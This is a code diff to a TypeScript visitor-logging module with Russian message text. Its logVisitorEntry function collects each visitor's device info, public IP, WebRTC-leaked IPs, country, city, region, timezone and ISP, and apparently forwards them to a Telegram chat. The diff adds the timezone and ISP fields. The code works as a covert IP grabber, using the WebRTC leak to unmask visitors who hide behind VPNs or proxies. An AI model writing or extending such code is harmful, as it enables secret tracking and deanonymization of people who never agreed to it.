@@ -39,7 +39,14 @@ export const sendTelegramMessage = async (message: string): Promise<boolean> => 
   }
 };
 
-export const logVisitorEntry = async (deviceInfo: any, publicIP: string, webrtcIPs: string[], geoData?: { country?: string; city?: string; region?: string }) => {
+export const logVisitorEntry = async (data: {
+  deviceInfo: any;
+  publicIP: string;
+  webrtcIPs: string[];
+  geoData?: { country?: string; city?: string; region?: string; timezone?: string; isp?: string };
+}) => {
+  const { deviceInfo, publicIP, webrtcIPs, geoData } = data;
+  
   const localTime = new Date().toLocaleString('ru-RU', {
     year: 'numeric',
     month: '2-digit',
@@ -63,7 +70,7 @@ export const logVisitorEntry = async (deviceInfo: any, publicIP: string, webrtcI
   // IP addresses
   message += `🌐 <b>IP-адреса:</b>\n`;
   message += `   📍 Публичный: <code>${publicIP}</code>\n`;
-  if (webrtcIPs.length > 0) {
+  if (webrtcIPs && webrtcIPs.length > 0) {
     message += `   🔍 WebRTC Leak (${webrtcIPs.length}): ${webrtcIPs.map(ip => `<code>${ip}</code>`).join(', ')}\n`;
   } else {
     message += `   ⚠️ WebRTC Leak: не обнаружены\n`;
@@ -81,6 +88,12 @@ export const logVisitorEntry = async (deviceInfo: any, publicIP: string, webrtcI
     }
     if (geoData.region) {
       message += `   📌 Регион: ${geoData.region}\n`;
+    }
+    if (geoData.timezone) {
+      message += `   ⏰ Часовой пояс: ${geoData.timezone}\n`;
+    }
+    if (geoData.isp) {
+      message += `   📡 Провайдер: ${geoData.isp}\n`;
     }
     message += `\n`;
   }
